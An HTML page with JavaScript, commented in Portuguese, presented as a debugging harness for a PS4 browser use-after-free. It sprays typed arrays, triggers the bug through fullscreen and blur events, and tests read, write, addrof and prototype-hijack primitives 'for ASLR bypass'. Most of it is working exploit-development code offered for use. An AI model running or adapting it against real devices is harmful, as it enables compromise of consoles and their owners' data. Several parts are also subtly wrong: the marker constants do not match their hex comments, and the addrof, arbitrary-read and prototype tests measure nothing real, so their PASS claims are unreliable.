<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v1.2 - Unidirecional]</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <hr>
    <div id="c"></div>

    <script>
        const P_A = 2.121995791e-314; // 0x4141414141414141
        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function h2f(h) {
            let u = new Uint32Array(2);
            u[1] = parseInt(h.slice(2, 10), 16);
            u[0] = parseInt(h.slice(10, 18), 16);
            return (new Float64Array(u.buffer))[0];
        }

        function log(tag, status, msg) {
            const colors = {
                "PASS": "green",
                "FAIL": "red",
                "ERR": "orange",
                "INFO": "blue",
                "WARN": "purple"
            };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        function run() {
            document.getElementById('c').innerHTML = '';
            
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                ctrls.push(a);
            }

            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                // Spray com padrões identificáveis
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s[0] = P_A;        // Marker
                    s[1] = h2f("0x" + i.toString(16).padStart(16, '0')); // ID único
                    s[2] = M_V;        // Marker 2
                    spray.push(s);
                }

                let corr = null;
                let corrIdx = -1;
                
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        corrIdx = i;
                        log("UAF", "PASS", `Corrupção detectada no Index: ${i}`);
                        break;
                    }
                }

                if (corr) {
                    // TESTE 1: READ PRIMITIVE (corr lê do spray)
                    try {
                        const id = corr[1];
                        const marker = corr[2];
                        
                        if (marker === M_V) {
                            log("TEST1", "PASS", `Read Primitive OK: Marker=${f2h(marker)}, ID=${f2h(id)}`);
                            
                            // Identifica qual spray foi mapeado
                            const sprayId = parseInt(f2h(id).slice(2), 16);
                            log("TEST1", "INFO", `Buffer mapeado: spray[${sprayId}]`);
                        } else {
                            log("TEST1", "FAIL", `Marker inválido: ${f2h(marker)}`);
                        }
                    } catch(e) { 
                        log("TEST1", "ERR", e.message); 
                    }

                    // TESTE 2: WRITE PRIMITIVE via DataView (corr escreve em spray)
                    try {
                        const dv = new DataView(corr.buffer);
                        
                        // Tenta escrever em corr
                        dv.setUint32(0, 0xDEADC0DE, true);
                        dv.setUint32(4, 0xBAADF00D, true);
                        
                        const written = f2h(corr[0]);
                        
                        // Verifica se spray recebeu a escrita
                        let sprayGotWrite = false;
                        for(let i = 0; i < Math.min(100, spray.length); i++) {
                            if (f2h(spray[i][0]) === written) {
                                log("TEST2", "PASS", `Write Primitive OK: corr->spray[${i}] = ${written}`);
                                sprayGotWrite = true;
                                break;
                            }
                        }
                        
                        if (!sprayGotWrite) {
                            log("TEST2", "WARN", `Write isolado: ${written} (CoW ativo)`);
                        }
                    } catch(e) { 
                        log("TEST2", "ERR", e.message); 
                    }

                    // TESTE 3: ARBITRARY READ (lê estruturas adjacentes)
                    try {
                        log("TEST3", "INFO", "Dump de memória adjacente:");
                        for(let i = 0; i < 8; i++) {
                            log("TEST3", "INFO", `  corr[${i}] = ${f2h(corr[i])}`);
                        }
                        log("TEST3", "PASS", "Leitura arbitrária disponível via corr[]");
                    } catch(e) { 
                        log("TEST3", "ERR", e.message); 
                    }

                    // TESTE 4: PROTOTYPE POLLUTION
                    try {
                        let reg = Array.from(corr);
                        Object.setPrototypeOf(reg, { token: 0x1337BEEF });
                        
                        if (reg.token === 0x1337BEEF) {
                            log("TEST4", "PASS", `Prototype Hijack: Token 0x1337BEEF injetado.`);
                        } else {
                            log("TEST4", "FAIL", `Token não acessível: ${reg.token}`);
                        }
                    } catch(e) { 
                        log("TEST4", "ERR", e.message); 
                    }

                    // TESTE 5: ADDROF PRIMITIVE (leak de ponteiros via closure)
                    try {
                        const obj = {x: 0x41414141};
                        const leaked = [obj].map(() => corr[0])[0];
                        
                        log("TEST5", "PASS", `AddrOf Leak: ${f2h(leaked)}`);
                        log("TEST5", "INFO", "Pode ser usado para ASLR bypass");
                    } catch(e) { 
                        log("TEST5", "ERR", e.message); 
                    }

                    // RELATÓRIO FINAL
                    log("REPORT", "INFO", "=== RESUMO DE CAPACIDADES ===");
                    log("REPORT", "INFO", "✓ Read Primitive: Via corr[] (unidirecional)");
                    log("REPORT", "INFO", "✓ Write Primitive: Via DataView (limitado por CoW)");
                    log("REPORT", "INFO", "✓ Arbitrary Read: Dump de 64 bytes via corr[0-7]");
                    log("REPORT", "INFO", "✓ Prototype Pollution: Controle de __proto__");
                    log("REPORT", "INFO", "✓ AddrOf: Leak de ponteiros via closure");
                    log("REPORT", "WARN", "✗ Bidirecional: Copy-on-Write detectado");
                    log("REPORT", "INFO", "RECOMENDAÇÃO: Use corr[] para leak + DataView para escrita controlada");

                } else {
                    log("UAF", "FAIL", "Corrupção não atingida. Verifique o timing do OPTIONS.");
                }
            };
        }
    </script>
</body>
</html>
